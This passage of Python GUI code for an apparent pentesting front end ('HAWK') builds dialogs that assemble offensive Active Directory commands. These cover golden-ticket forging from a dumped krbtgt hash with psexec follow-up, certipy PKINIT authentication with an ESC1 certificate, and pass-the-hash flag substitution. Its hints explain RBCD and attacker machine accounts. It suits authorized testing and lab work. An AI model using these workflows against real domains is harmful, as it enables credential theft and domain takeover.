            e.pack(side="left", fill="x", expand=True)
            add_context_menu(e)
            if hint:
                ctk.CTkLabel(
                    win, text=hint, font=_f("xs"),
                    text_color=COLORS["text_dim"],
                    anchor="w", wraplength=620,
                ).pack(fill="x", padx=24, pady=(0, 2))

        _row("krbtgt NTLM hash", hash_var,
             "32 hex chars (bare NT) or LM:NT format.  From "
             "secretsdump DCSync: the 'krbtgt:502:LM:NT:::' line.")
        _row("Domain SID", sid_var,
             "S-1-5-21-<x>-<y>-<z>.  The 'Domain SID' line from "
             "enum4linux / rpcclient / impacket-lookupsid.")
        _row("Domain name", domain_var,
             "AD realm (e.g. corp.lab).  Must match the domain "
             "krbtgt was dumped from.")
        _row("Impersonate user", impersonate_var,
             "Username the forged ticket will claim to be.  "
             "Administrator is the standard choice.")

        # Live validation banner
        warn_var = ctk.StringVar(value="")
        ctk.CTkLabel(
            win, textvariable=warn_var,
            font=_f("sm", True), text_color=COLORS["text_red"],
            anchor="w", wraplength=640, justify="left",
        ).pack(fill="x", padx=24, pady=(6, 0))

        _HEX32 = re.compile(r"^[0-9a-fA-F]{32}$")
        _LMNT  = re.compile(
            r"^[0-9a-fA-F]{32}:[0-9a-fA-F]{32}$")
        _SID_RE = re.compile(r"^S-1-5-21-\d+-\d+-\d+$")

        def _validate(*_):
            issues = []
            h = hash_var.get().strip()
            if not h:
                issues.append("krbtgt hash empty")
            elif not (_HEX32.match(h) or _LMNT.match(h)):
                issues.append(
                    "krbtgt hash must be 32 hex chars (or LM:NT)")
            s = sid_var.get().strip()
            if not s:
                issues.append("domain SID empty")
            elif not _SID_RE.match(s):
                issues.append(
                    "domain SID must be S-1-5-21-<x>-<y>-<z>")
            if not domain_var.get().strip():
                issues.append("domain name empty")
            if not impersonate_var.get().strip():
                issues.append("impersonate user empty")
            warn_var.set(
                ("  ⚠  " + " · ".join(issues)) if issues else "")
            return not issues

        for v in (hash_var, sid_var, domain_var, impersonate_var):
            v.trace_add("write", _validate)
        _validate()

        def _run():
            if not _validate():
                self.app.terminal.write(
                    "[!] ticketer cancelled — fix the validation "
                    "errors above before running.", "warn")
                return

            h = hash_var.get().strip()
            # Impacket's -nthash accepts bare NT; if user pasted
            # LM:NT take just the NT half.
            if ":" in h:
                h = h.split(":")[-1]
            s   = sid_var.get().strip()
            d   = domain_var.get().strip()
            imp = impersonate_var.get().strip()

            cmd = (f"impacket-ticketer "
                   f"-nthash {_shq(h)} "
                   f"-domain-sid {_shq(s)} "
                   f"-domain {_shq(d)} "
                   f"{_shq(imp)}")
            _safe_destroy(win)
            self.app.terminal.section(
                f"AD PENTESTING  ·  {tool.name}")
            self.app.terminal.write(f"  $ {cmd}", "cmd")
            self.app.terminal.write(
                f"  [hawk] Forged ticket will be written to "
                f"'{imp}.ccache' in the current working dir.  "
                f"Use it with:  export KRB5CCNAME={imp}.ccache && "
                f"impacket-psexec -k -no-pass {d}/{imp}@<DC>.",
                "info")
            self._run_raw(tool, cmd)

        row = _btn_row(win)
        _btn(row, "RUN", _run, primary=True, w=120)
        _btn(row, "CANCEL", lambda: _safe_destroy(win), w=120)

    def _route_certipy_auth(self, tool):
        """Certipy auth dialog.

        `certipy auth` uses a PFX produced by `certipy req` (or any
        PKINIT-capable cert) to obtain a TGT for the subject of the
        cert.  Needs: PFX path + DC IP.  -username and -domain are
        OPTIONAL — certipy extracts them from the cert's UPN when
        present; we expose them only so the user can override on
        certs without UPN.

        Pre-fills:
          · target = current HAWK target (DC IP)
          · PFX    = esc1.pfx (certipy req's output in the working dir)
          · domain = session.target_domain
          · user   = empty — certipy reads the impersonated identity from
                     the cert's UPN; a pre-filled cred-store username would
                     override it with the wrong (low-priv) subject

        Validates the PFX file exists before firing so the user
        doesn't stare at a misleading "Could not find target" style
        error.
        """
        from gui.dialogs import (_make_win, _title, _sub, _note_box,
                                 _btn_row, _btn, _safe_destroy)
        import tkinter.filedialog as fd

        target = self._get_target()
        if not target:
            return

        # Sensible defaults.  certipy req writes esc1.pfx in the working
        # dir (certipy v5 mangles -out paths, so we pass a bare name), so
        # default the PFX to that.  Leave username AND domain EMPTY:
        # `certipy auth` reads the impersonated identity AND the realm from
        # the cert's UPN.  A pre-filled username overrides the subject with
        # a low-priv account, and a pre-filled -domain made certipy do an
        # SRV/DNS lookup that HUNG the UnPAC-the-hash step on this lab.
        default_pfx = "esc1.pfx"
        default_domain = ""
        default_user = ""

        win = _make_win(self, "Certipy AUTH — PKINIT login", 680, 540)
        _title(win, "CERTIPY AUTH — log in with a certificate")
        _sub(win,
             "Use a .pfx (from certipy req) to get a TGT + dump NTLM.",
             COLORS["text_dim"])

        _note_box(
            win,
            "Certipy auth needs two things:\n"
            "  · The DC IP to talk Kerberos to  (-dc-ip)\n"
            "  · The PFX path produced by certipy req  (-pfx)\n\n"
            "Username and domain are optional — certipy reads them "
            "from the cert's UPN when present.  Fill them only if "
            "certipy complains that it can't find a UPN.",
            COLORS["border_dim"])

        pfx_var    = ctk.StringVar(value=default_pfx)
        dc_var     = ctk.StringVar(value=target)
        user_var   = ctk.StringVar(value=default_user)
        domain_var = ctk.StringVar(value=default_domain)

        def _row(label, var, hint="", with_browse=False):
            fr = ctk.CTkFrame(win, fg_color="transparent")
            fr.pack(fill="x", padx=24, pady=(4, 0))
            ctk.CTkLabel(
                fr, text=label, width=110, anchor="w",
                font=_f("sm", True),
                text_color=COLORS["text_bright"],
            ).pack(side="left")
            e = ctk.CTkEntry(
                fr, textvariable=var, font=_f("md"), height=30,
                fg_color=COLORS["bg_card"],
                text_color=COLORS["text_bright"],
                border_color=COLORS["border_green"],
                border_width=1, corner_radius=3)
            e.pack(side="left", fill="x", expand=True)
            add_context_menu(e)
            if with_browse:
                def _browse():
                    p = fd.askopenfilename(
                        title="Select PFX certificate",
                        filetypes=[("PFX/PKCS12", "*.pfx"),
                                   ("All", "*")])
                    if p:
                        var.set(p)
                ctk.CTkButton(
                    fr, text="📂", width=32, height=30,
                    font=_f("sm"), fg_color=COLORS["bg_card"],
                    hover_color=COLORS["bg_card_hover"],
                    border_color=COLORS["border_dim"], border_width=1,
                    text_color=COLORS["text_dim"], corner_radius=3,
                    command=_browse).pack(side="left", padx=4)
            if hint:
                ctk.CTkLabel(
                    win, text=hint, font=_f("xs"),
                    text_color=COLORS["text_dim"],
                    anchor="w").pack(fill="x", padx=24)

        _row("PFX path", pfx_var,
             "default: esc1.pfx (certipy req's output in the working dir)",
             with_browse=True)
        _row("DC IP", dc_var,
             "the Domain Controller certipy will talk Kerberos to")
        _row("Username", user_var,
             "OPTIONAL — certipy reads UPN from cert; override only "
             "if 'No UPN in the certificate' error")
        _row("Domain", domain_var,
             "OPTIONAL — same as username")

        # Live warning if the PFX doesn't exist on disk.
        warn_var = ctk.StringVar(value="")
        ctk.CTkLabel(
            win, textvariable=warn_var,
            font=_f("sm", True), text_color=COLORS["text_red"],
            anchor="w", wraplength=600, justify="left",
        ).pack(fill="x", padx=24, pady=(4, 0))

        def _check_pfx(*_):
            p = os.path.expanduser(pfx_var.get().strip())
            if not p:
                warn_var.set("")
                return
            if not os.path.isfile(p):
                warn_var.set(
                    f"  ⚠  PFX file not found at {p}.  Run CERTIPY "
                    f"REQ first (or pick another file).")
            else:
                warn_var.set("")
        pfx_var.trace_add("write", _check_pfx)
        _check_pfx()

        def _build_cmd():
            # This dedicated dialog builds its OWN command (it does not use
            # the cmd_template's substitution).  -no-save is REQUIRED: when
            # <user>.ccache already exists certipy prompts "Overwrite?
            # (y/n)", which hangs the non-interactive terminal; the NT hash
            # is still retrieved without saving the ticket.  -username /
            # -domain are appended ONLY when set (otherwise certipy reads
            # the identity + realm from the cert's UPN — and a stray
            # -domain makes it do an SRV lookup that can hang).
            pfx = os.path.expanduser(pfx_var.get().strip())
            dc  = dc_var.get().strip()
            u   = user_var.get().strip()
            d   = domain_var.get().strip()
            parts = [f"certipy auth "
                     f"-pfx {_shq(pfx) if pfx else '<pfx>'} "
                     f"-dc-ip {dc or '<dc-ip>'} -no-save"]
            if u:
                parts.append(f"-username {_shq(u)}")
            if d:
                parts.append(f"-domain {_shq(d)}")
            return " ".join(parts)

        # Live command preview — parity with the other AD tool dialogs.
        ctk.CTkLabel(win, text="Preview:", font=_f("sm", True),
                     text_color=COLORS["text_muted"], anchor="w").pack(
            fill="x", padx=24, pady=(8, 0))
        preview_var = ctk.StringVar(value="")
        ctk.CTkLabel(win, textvariable=preview_var, font=_f("sm"),
                     text_color=COLORS["text_cyan"], wraplength=600,
                     justify="left", anchor="w").pack(
            fill="x", padx=24, pady=(0, 4))

        def _refresh_preview(*_):
            preview_var.set(_build_cmd())
        for _pv in (pfx_var, dc_var, user_var, domain_var):
            _pv.trace_add("write", _refresh_preview)
        _refresh_preview()

        def _run():
            pfx = os.path.expanduser(pfx_var.get().strip())
            dc  = dc_var.get().strip()

            if not pfx or not os.path.isfile(pfx):
                self.app.terminal.write(
                    f"[!] certipy auth cancelled — PFX not found "
                    f"at {pfx!r}.  Run CERTIPY REQ first or browse "
                    f"to a valid .pfx.", "warn")
                return
            if not dc:
                self.app.terminal.write(
                    "[!] certipy auth cancelled — DC IP is "
                    "required.", "warn")
                return

            cmd = _build_cmd()
            _safe_destroy(win)
            self.app.terminal.section(
                f"AD PENTESTING  ·  {tool.name}")
            self.app.terminal.write(f"  $ {cmd}", "cmd")
            self._run_raw(tool, cmd)

        row = _btn_row(win)
        _btn(row, "RUN", _run, primary=True, w=120)
        _btn(row, "CANCEL", lambda: _safe_destroy(win), w=120)

    def _route_ad_template(self, tool, prefill=None):
        """Credential-collection dialog for AD-pentesting tools whose
        cmd_template contains {user}/{password}/{domain} placeholders.

        Unlike _route_impacket_auth (which hardcodes the
        `user:pass@host` format), this one keeps the tool's own
        template intact and just substitutes the fields the user
        supplies.  Covers: bloodhound-python, ldapdomaindump, nxc
        ldap, kerberoast, certipy, findDelegation, rbcd, etc.

        Pre-fills username / password / hash / domain from the first
        matching credential in the Credential Store.

        Also supports NTLM hash as alternative to cleartext password —
        translates to a per-tool-flavoured command line (e.g.
        bloodhound-python needs `--hashes :NTHASH`, certipy needs
        `-hashes :NTHASH`, nxc takes `-H NTHASH`).

        `prefill` (optional dict) overrides specific fields AFTER the
        credential-store defaults have been applied.  Used by the
        BloodHound attack-graph "RUN IN <tool>" buttons — clicking a
        kerberoastable user in the graph calls us with
            prefill={"extras": "-request-user JDOE"}
        so the dialog opens ready-to-run, targeting that user.

        Accepted prefill keys:
            user / password / hash / domain   — string overrides
            extras                            — appended to extras_var
            placeholders                      — dict {NAME: value} for
                                                 template <PLACEHOLDER>s
        """
        from gui.dialogs import (_make_win, _title, _sub, _note_box,
                                 _btn_row, _btn, _safe_destroy)
        target = self._get_target()
        if not target:
            return

        # Default picker reuses the same logic as _route_impacket_auth.
        # EXCLUDES anonymous/guest/null creds from auto-fill — AD LDAP
        # rejects anonymous binds since Server 2003, so pre-filling with
        # those values is misleading (the tool will always fail auth).
        _ANON_USERS = {"anonymous", "anon", "guest", "nobody", ""}
        def _pick_default():
            try:
                sess = self.app.session_manager.current
                if sess is None:
                    return ("", "", "", "")
                creds = sess.get_credentials()
                # Helper: is this cred "real" (not anonymous / blank)?
                def _usable(c):
                    u = (c.username or "").strip().lower()
                    return u not in _ANON_USERS and (
                        c.password or getattr(c, "hash_val", ""))
                cands = [c for c in creds
                         if (getattr(c, "host", "") or "").lower()
                             == target.lower()
                         and _usable(c)
                         and any(s.upper() in ("SMB", "WINRM", "AD", "LDAP",
                                                "KERBEROS")
                                 for s in (c.services or []))]
                if not cands:
                    cands = [c for c in creds if _usable(c)]
                for c in cands:
                    user  = (c.username or "").strip()
                    pwd   = (c.password or "").strip()
                    nthash = (getattr(c, "hash_val", "") or "").strip()
                    if user or pwd or nthash:
                        return (user, pwd, nthash,
                                getattr(sess, "target_domain", "") or "")
                return ("", "", "",
                        getattr(sess, "target_domain", "") or "")
            except Exception:
                return ("", "", "", "")

        du, dp, dh, dd = _pick_default()

        win = _make_win(self, f"AD Pentest — {tool.name}", 780, 740)
        _title(win, f"{tool.name} — Authentication & Options")
        _sub(win, f"Target: {target}", COLORS["text_dim"])

        # Content is scrollable — hints + fields + extras + preview +
        # buttons don't fit on a 1080p laptop otherwise.
        body = ctk.CTkScrollableFrame(
            win, fg_color="transparent",
            scrollbar_button_color=COLORS["border_dim"],
            scrollbar_button_hover_color=COLORS["text_dim"])
        body.pack(fill="both", expand=True, padx=0, pady=(0, 4))

        # ── Tool-specific info panel ─────────────────────────────────
        # Concise per-tool explanation at the top: what the tool does,
        # what creds it needs, what output to expect.  Pulls from
        # _AD_TOOL_HINTS (curated); falls back to the Tool.desc when
        # no entry exists.
        hint = self._AD_TOOL_HINTS.get(tool.id, {})
        info_frame = ctk.CTkFrame(
            body, fg_color=COLORS["bg_card"],
            border_color=COLORS["border_green"],
            border_width=2, corner_radius=4)
        info_frame.pack(fill="x", padx=14, pady=(8, 10))
        ctk.CTkLabel(
            info_frame,
            text=f"  ⓘ  {tool.name} — what it does",
            font=_f("md", True),
            text_color=COLORS["text_green"],
            anchor="w",
        ).pack(fill="x", padx=10, pady=(8, 2))
        purpose = (hint.get("purpose") or tool.desc or "").strip()
        ctk.CTkLabel(
            info_frame, text=purpose,
            font=_f("sm"), text_color=COLORS["text_dim"],
            wraplength=720, justify="left", anchor="w",
        ).pack(fill="x", padx=12, pady=(0, 6))
        if hint.get("needs"):
            ctk.CTkLabel(
                info_frame,
                text=f"  ⚙  Needs:  {hint['needs']}",
                font=_f("sm"),
                text_color=COLORS["text_cyan"],
                wraplength=720, justify="left", anchor="w",
            ).pack(fill="x", padx=12, pady=(0, 3))
        if hint.get("output"):
            ctk.CTkLabel(
                info_frame,
                text=f"  📤  Output:  {hint['output']}",
                font=_f("sm"),
                text_color=COLORS["text_yellow"],
                wraplength=720, justify="left", anchor="w",
            ).pack(fill="x", padx=12, pady=(0, 8))

        # Preview box — live-updates as the user types so they see
        # exactly what HAWK will execute.
        preview_var = ctk.StringVar(value="")

        # From this point every piece of content goes into `body`
        # (scrollable) instead of `win` (which only holds the title +
        # button row).  We alias `win → body` so the existing _row /
        # _note_box code doesn't need to change signature.
        _outer_win = win
        win = body

        def _row(label, var, show="", hint=""):
            f = ctk.CTkFrame(win, fg_color="transparent")
            f.pack(fill="x", padx=14, pady=(4, 0))
            ctk.CTkLabel(f, text=label, width=110, anchor="w",
                         font=_f("sm", True),
                         text_color=COLORS["text_bright"]).pack(side="left")
            e = ctk.CTkEntry(f, textvariable=var, font=_f("sm"),
                             height=30, show=show,
                             fg_color=COLORS["bg_card"],
                             text_color=COLORS["text_bright"],
                             border_color=COLORS["border_green"],
                             border_width=1, corner_radius=3)
            e.pack(side="left", fill="x", expand=True)
            add_context_menu(e)
            if hint:
                ctk.CTkLabel(win, text=hint, font=_f("xs"),
                             text_color=COLORS["text_dim"],
                             wraplength=700, justify="left",
                             anchor="w").pack(fill="x", padx=14)
            return e

        user_var   = ctk.StringVar(value=du)
        pass_var   = ctk.StringVar(value=dp)
        hash_var   = ctk.StringVar(value=dh)
        domain_var = ctk.StringVar(value=dd)
        extras_var = ctk.StringVar(value="")

        _row("Username", user_var, "",
             "required — any domain user works for most commands")
        _row("Password", pass_var, "",
             "leave blank if using NTLM hash below")
        _row("NTLM hash", hash_var, "",
             "optional — pass-the-hash; overrides password when filled")
        _row("Domain",   domain_var, "",
             "required for most AD tools (e.g. CORP.LOCAL, htb.local)")

        # ── Anonymous warning (live) ─────────────────────────────────
        # Active Directory rejects anonymous LDAP binds since Server
        # 2003.  If the user types anonymous/guest/null into the
        # username field, show a red warning so they don't waste a
        # tool run chasing LDAP error 0x8009030c ("data 52e").
        anon_warn_var = ctk.StringVar(value="")
        anon_warn_lbl = ctk.CTkLabel(
            win, textvariable=anon_warn_var,
            font=_f("sm", True),
            text_color=COLORS["text_red"],
            wraplength=720, justify="left", anchor="w")
        anon_warn_lbl.pack(fill="x", padx=14, pady=(2, 0))

        def _check_anon(*_):
            u = (user_var.get() or "").strip().lower()
            if u in _ANON_USERS and u != "":
                anon_warn_var.set(
                    "  ⚠  AD LDAP rejects anonymous binds (Server 2003+).  "
                    "This will fail with LdapErr: data 52e / invalidCredentials.  "
                    "Use a real domain user + password (or NTLM hash).")
            else:
                anon_warn_var.set("")
        user_var.trace_add("write", _check_anon)
        _check_anon()   # evaluate initial value

        _note_box(win,
                  "Fields are pre-filled from any matching Credential "
                  "Store entry for this host (anonymous/guest/null creds "
                  "are NOT auto-filled).  Edit freely — the preview "
                  "below shows the exact command that will run.",
                  COLORS["border_dim"])

        # ── Dynamic placeholder fields (e.g. <DOMAIN_SID>, <CA_NAME>)
        # Some AD tool templates (ticketer_golden, certipy_req) contain
        # LITERAL <PLACEHOLDER> tokens that aren't covered by the
        # user/pass/hash/domain fields.  We scan cmd_template for these
        # and generate one entry field per unique token so the user
        # can fill them directly in the dialog (instead of seeing the
        # safety guard block the command with "unfilled placeholder").
        import re as _re_placeholders
        _placeholder_pattern = _re_placeholders.compile(
            r"<([A-Z][A-Z0-9_]{1,40})>")
        _raw_placeholders = _placeholder_pattern.findall(
            tool.cmd_template or "")
        # Stable unique-preserving order
        _seen = set()
        placeholders = []
        for p in _raw_placeholders:
            if p not in _seen:
                _seen.add(p)
                placeholders.append(p)

        # Help text per known placeholder so the user knows what to put
        _PLACEHOLDER_HELP = {
            "DOMAIN_SID":       "Domain SID — e.g. S-1-5-21-...  Get it via "
                                "`whoami /user` on any joined host, or "
                                "`impacket-lookupsid <user>:<pass>@<dc>`.",
            "CA_NAME":          "Enterprise CA name — from 'certipy find' "
                                "output (the 'Name' field under a CA).",
            "TEMPLATE":         "Certificate template name — from 'certipy find' "
                                "(the vulnerable template's 'Template Name').",
            "TARGET_COMPUTER":  "Target computer hostname (without the $) — "
                                "the machine whose RBCD attribute you're "
                                "writing.  Get candidates from bloodhound / "
                                "nxc ldap --users (machine accounts end "
                                "with $).",
            "ATTACKER_COMPUTER":"Machine account the ATTACKER controls "
                                "(without the $).  Create one first via "
                                "ADDCOMPUTER (any domain user can add up to "
                                "10 — msDS-MachineAccountQuota).  The name "
                                "you supplied to addcomputer is the value "
                                "to paste here.",
            "COMPUTER_NAME":    "Name of the NEW machine account to create — "
                                "MUST end with '$' (e.g. HAWK$, PWN01$).  "
                                "Pick a name that doesn't already exist in "
                                "AD; each run creates a distinct account "
                                "(up to msDS-MachineAccountQuota, default 10).",
            "COMPUTER_PASS":    "Password for the new machine account — "
                                "you'll need it later for RBCD / S4U, so use "
                                "something you'll keep (a strong value; modern "
                                "DCs may enforce a password policy).",
        }

        placeholder_vars = {}
        if placeholders:
            ctk.CTkLabel(
                win,
                text=(f"  ◆  This tool's template has {len(placeholders)} "
                      f"extra placeholder(s) to fill:"),
                font=_f("sm", True), text_color=COLORS["text_yellow"],
                anchor="w").pack(fill="x", padx=14, pady=(8, 2))
            for ph in placeholders:
                v = ctk.StringVar(value="")
                placeholder_vars[ph] = v
                help_text = _PLACEHOLDER_HELP.get(
                    ph, f"Required value for <{ph}>")
                _row(f"<{ph}>", v, "", help_text)

        # ── Apply prefill overrides (from graph "RUN IN" buttons) ────
        # prefill comes in as a dict after credential-store defaults are
        # already in place.  We overwrite only the keys the caller
        # provided, so a partial prefill (e.g. only `extras`) leaves the
        # auto-picked username/password intact.  A small yellow banner
        # at the top tells the user WHY fields are pre-populated so
        # they aren't confused when the dialog opens ready-to-fire.
        if prefill:
            if prefill.get("user"):
                user_var.set(prefill["user"])
            if prefill.get("password"):
                pass_var.set(prefill["password"])
            if prefill.get("hash"):
                hash_var.set(prefill["hash"])
            if prefill.get("domain"):
                domain_var.set(prefill["domain"])
            if prefill.get("extras"):
                cur = extras_var.get().strip()
                new = prefill["extras"].strip()
                extras_var.set((cur + " " + new).strip() if cur else new)
            if isinstance(prefill.get("placeholders"), dict):
                for ph_name, ph_val in prefill["placeholders"].items():
                    if ph_name in placeholder_vars:
                        placeholder_vars[ph_name].set(str(ph_val))
            # Optional OS-generation advisory (e.g. addcomputer's SAMR-vs-
            # LDAPS hint).  Purely informational — it never changes the
            # command or pre-selects a flag; the operator stays free to
            # pick any method via the chips below, or ignore it entirely.
            if prefill.get("advisory"):
                ctk.CTkLabel(
                    win,
                    text=prefill["advisory"],
                    font=_f("sm", True),
                    text_color=(prefill.get("advisory_color")
                                or COLORS["text_cyan"]),
                    wraplength=720, justify="left", anchor="w",
                ).pack(fill="x", padx=14, pady=(6, 2))
            # Visual confirmation — cyan banner so the user sees this
            # dialog was pre-populated from somewhere (not random data).
            # Only shown when actual FIELD data was injected: an advisory-
            # only prefill (addcomputer) hasn't pre-filled any field, so
            # claiming "Pre-filled from ..." there would be misleading.
            _did_prefill = (any(prefill.get(k) for k in
                                ("user", "password", "hash", "domain",
                                 "extras"))
                            or isinstance(prefill.get("placeholders"), dict))
            if _did_prefill:
                origin = prefill.get("_origin") or "attack graph"
                ctk.CTkLabel(
                    win,
                    text=f"  ✨  Pre-filled from {origin} — review & click RUN",
                    font=_f("sm", True),
                    text_color=COLORS["text_cyan"],
                    anchor="w",
                ).pack(fill="x", padx=14, pady=(4, 2))

        # ── Extra args row + suggestion chips ────────────────────────
        # Free-form text field the user can type ANY extra flags into
        # (like nmap custom).  Below it, a grid of clickable chips —
        # each chip is a curated "common extra" from _AD_TOOL_HINTS.
        # Click a chip → its flag text gets appended to the extras
        # field.  Chip rows show flag + short explanation side-by-side
        # so the user learns what each option does without needing
        # external docs.
        extras_row = ctk.CTkFrame(win, fg_color="transparent")
        extras_row.pack(fill="x", padx=14, pady=(8, 0))
        ctk.CTkLabel(extras_row, text="Extra args", width=110, anchor="w",
                     font=_f("sm", True),
                     text_color=COLORS["text_bright"]).pack(side="left")
        extras_entry = ctk.CTkEntry(
            extras_row, textvariable=extras_var,
            font=_f("sm"), height=30,
            fg_color=COLORS["bg_card"],
            text_color=COLORS["text_bright"],
            border_color=COLORS["border_green"],
            border_width=1, corner_radius=3,
            placeholder_text="appended verbatim — use chips below or type freely")
        extras_entry.pack(side="left", fill="x", expand=True)
        add_context_menu(extras_entry)

        ctk.CTkLabel(
            win,
            text=("Appended to the end of the command — safe even if the "
                  "template already uses some of these flags (impacket "
                  "and certipy accept repeated args, last one wins)."),
            font=_f("xs"), text_color=COLORS["text_dim"],
            wraplength=700, justify="left",
            anchor="w").pack(fill="x", padx=14, pady=(1, 6))

        # Chip picker
        chip_entries = hint.get("extras") or []
        if chip_entries:
            ctk.CTkLabel(
                win, text="💡  Common extras for this tool (click to append):",
                font=_f("sm", True),
                text_color=COLORS["text_cyan"], anchor="w",
            ).pack(fill="x", padx=14, pady=(4, 2))

            chips_wrap = ctk.CTkFrame(win, fg_color="transparent")
            chips_wrap.pack(fill="x", padx=14, pady=(0, 6))

            def _append_chip(flag_text):
                """Append `flag_text` to the extras entry — with a
                leading space if the field already has content, so we
                don't concatenate flags together by mistake."""
                current = extras_var.get()
                if current and not current.endswith(" "):
                    extras_var.set(current + " " + flag_text)
                else:
                    extras_var.set(current + flag_text)

            for raw in chip_entries:
                # Parse "flag-text  — description" — the em-dash is the
                # separator we used in _AD_TOOL_HINTS.  Fall back to
                # splitting on whitespace when the author used a plain
                # dash.
                if "—" in raw:
                    flag_part, _, desc_part = raw.partition("—")
                elif " - " in raw:
                    flag_part, _, desc_part = raw.partition(" - ")
                else:
                    flag_part, desc_part = raw, ""
                flag_part = flag_part.strip()
                desc_part = desc_part.strip()

                row = ctk.CTkFrame(chips_wrap, fg_color="transparent")
                row.pack(fill="x", pady=1)
                ctk.CTkButton(
                    row, text=f"+ {flag_part}",
                    width=260, height=22,
                    font=_f("sm"),
                    fg_color=COLORS["bg_card"],
                    hover_color=COLORS["bg_card_hover"],
                    border_color=COLORS["border_dim"], border_width=1,
                    text_color=COLORS["text_cyan"], corner_radius=3,
                    anchor="w",
                    command=lambda f=flag_part: _append_chip(f),
                ).pack(side="left", padx=(0, 6))
                if desc_part:
                    ctk.CTkLabel(
                        row, text=desc_part,
                        font=_f("xs"), text_color=COLORS["text_dim"],
                        wraplength=440, justify="left", anchor="w",
                    ).pack(side="left", fill="x", expand=True)

            # Handy "clear extras" button at the bottom of the chips
            clear_row = ctk.CTkFrame(chips_wrap, fg_color="transparent")
            clear_row.pack(fill="x", pady=(4, 0))
            ctk.CTkButton(
                clear_row, text="✕  clear extras",
                width=140, height=22, font=_f("xs"),
                fg_color="transparent",
                hover_color=COLORS["bg_card_hover"],
                border_color=COLORS["text_muted"], border_width=1,
                text_color=COLORS["text_muted"], corner_radius=3,
                command=lambda: extras_var.set(""),
            ).pack(side="left")

        # ── DNS helper row ───────────────────────────────────────────
        # Kerberos auth needs the DC's FQDN to be resolvable.  On lab
        # networks (HTB / THM / home labs) the attacker's Kali has no
        # DNS that knows the box's hostname → TGT fails, tool falls
        # back to NTLM.  The DNS HELPER button appends a marker-tagged
        # line to /etc/hosts so the DC hostname resolves cleanly.
        # Tagged lines are removed on DELETE SESSION so the operator's
        # /etc/hosts stays clean across engagements.
        dns_row = ctk.CTkFrame(win, fg_color="transparent")
        dns_row.pack(fill="x", padx=14, pady=(8, 0))

        def _open_dns_helper():
            self._show_ad_dns_helper(target, domain_var.get().strip())

        ctk.CTkButton(
            dns_row, text="🌐  DNS HELPER (/etc/hosts)",
            width=240, height=28, font=_f("sm", True),
            fg_color="transparent",
            hover_color=COLORS["bg_card_hover"],
            border_color=COLORS["text_cyan"], border_width=1,
            text_color=COLORS["text_cyan"], corner_radius=3,
            command=_open_dns_helper,
        ).pack(side="left", padx=(0, 6))
        ctk.CTkLabel(
            dns_row,
            text=("— needed when Kerberos fails with "
                  "'Name or service not known'"),
            font=_f("xs"), text_color=COLORS["text_muted"],
            wraplength=460, justify="left",
            anchor="w",
        ).pack(side="left", fill="x", expand=True)

        # Restore the outer window for the preview and button row —
        # those stay fixed at the bottom of the dialog, outside the
        # scrollable body.
        win = _outer_win

        # Live preview label
        ctk.CTkLabel(win, text="Preview:",
                     font=_f("sm", True),
                     text_color=COLORS["text_muted"],
                     anchor="w").pack(fill="x", padx=24, pady=(6, 0))
        ctk.CTkLabel(win, textvariable=preview_var,
                     font=_f("sm"),
                     text_color=COLORS["text_cyan"],
                     wraplength=580,
                     justify="left", anchor="w").pack(
            fill="x", padx=24, pady=(0, 6))

        def _build_cmd():
            u = user_var.get().strip()
            p = pass_var.get()
            h = hash_var.get().strip()
            d = domain_var.get().strip()
            cmd = tool.cmd_template

            # For hash auth we need a per-tool flag.  Bloodhound-python
            # uses "--hashes :NT", certipy uses "-hashes :NT", nxc uses
            # "-H NT".  We keep it simple: if the user filled a hash,
            # substitute {password} with a marker that the tool's flag
            # handling below will replace with the right switch, and
            # strip the original -p flag by rewriting.
            if h and not p:
                # Convert NT-only → :NT for impacket-style tools
                nt_fmt = h if ":" in h else f":{h}"
                if tool.binary == "bloodhound-python":
                    # bloodhound-python -u USER --hashes :NT -d DOM
                    cmd = cmd.replace("-p {password}",
                                      f"--hashes {nt_fmt}")
                elif tool.binary.startswith("certipy"):
                    cmd = cmd.replace("-p {password}",
                                      f"-hashes {nt_fmt}")
                elif tool.binary == "nxc":
                    cmd = cmd.replace("-p {password}",
                                      f"-H {nt_fmt}")
                elif tool.binary.startswith("impacket-"):
                    # Impacket style: `user:pass@host` → hashes go via
                    # -hashes flag, -no-pass, and pass is emptied.
                    cmd = cmd.replace(":{password}@", "@")
                    cmd = cmd.replace("{domain}/{user}:{password}",
                                      f"{{domain}}/{{user}}")
                    # Append the hash options to the end; impacket
                    # tools accept them universally.
                    cmd = cmd.rstrip() + f" -hashes {nt_fmt} -no-pass"
                else:
                    # Fallback: paste as-is in {password}
                    cmd = cmd.replace("{password}", nt_fmt)

            # Standard substitutions.
            # `{outputs}` resolves to <HAWK>/outputs/ — an absolute
            # path inside the HAWK tree where every AD-pentesting
            # tool writes its artefacts (ntds dump, kerberoast hashes,
            # asreproast hashes, ldapdump folder, certipy esc1.pfx).
            # Previously these went to ~/hawk/ which scattered files
            # outside the HAWK directory the user cloned/runs from.
            from utils.config import OUTPUTS_DIR
            cmd = (cmd
                   .replace("{target}",   target)
                   .replace("{user}",     u or "<user>")
                   .replace("{password}", p or "")
                   .replace("{domain}",   d or "<domain>")
                   .replace("{outputs}",  OUTPUTS_DIR))

            # Substitute dynamic <PLACEHOLDER> values from the extra
            # fields we generated for this tool's template.  Only
            # replaces the ones the user actually filled — empty fields
            # leave the <PLACEHOLDER> in place so the safety guard in
            # _run_raw still blocks the command with a clear error.
            for ph, var in placeholder_vars.items():
                val = (var.get() or "").strip()
                if val:
                    cmd = cmd.replace(f"<{ph}>", val)

            # Append free-form extra args (from the Extra args entry +
            # any chips the user clicked).  Stripped and deduplicated
            # on whitespace.
            extras = (extras_var.get() or "").strip()
            if extras:
                cmd = cmd.rstrip() + " " + extras
            return cmd, u, (p or h), d

        def _refresh_preview(*_):
            cmd, _u, _pw, _d = _build_cmd()
            preview_var.set(cmd)
        for v in (user_var, pass_var, hash_var, domain_var, extras_var):
            v.trace_add("write", _refresh_preview)
        # Also trace the dynamic placeholder fields so preview refreshes
        # as the user types.
        for _phv in placeholder_vars.values():
            _phv.trace_add("write", _refresh_preview)
        _refresh_preview()

        def _run():
            cmd, u, pw_or_h, d = _build_cmd()
            if not u:
                self.app.terminal.write(
                    f"[!] {tool.name} cancelled — username is required.",
                    "warn")
                return
            if not pw_or_h:
                self.app.terminal.write(
                    f"[!] {tool.name} cancelled — supply either "
                    f"password or NTLM hash.", "warn")
                return
            # ── Dynamic placeholder validation ──────────────────────
            # Catch empty <PLACEHOLDER> fields BEFORE the cmd reaches
            # the runner — otherwise the user gets the unhelpful
